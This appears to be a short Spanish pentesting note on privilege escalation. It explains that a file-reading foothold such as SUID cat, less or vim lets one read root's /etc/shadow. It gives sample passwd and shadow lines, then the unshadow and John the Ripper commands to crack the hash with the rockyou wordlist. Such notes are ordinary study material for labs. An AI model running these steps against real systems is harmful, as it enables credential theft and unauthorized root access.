Al encontrar forma de leer ficheros que pertenecen a **root**, por ejemplo con permiso SUID a ___cat, less, vim___ , podemos intentar leer el fichero **/etc/shadow** y crackearlo.

#### Crack /etc/shadow

neceistamos:
* /etc/passwd (con la linea donde aparece root)
* /etc/shadow (con la linea donde aparece root)

EJEMPLO:
```
/etc/passwd
root:x:0:0:root:/root:/bin/bash

/etc/shadow
root:6riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7:::
```


Primero ejecutamos unshadow, y luego pasamos john the ripper
```bash
unshadow passwd shadow > unshadowed.txt

john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```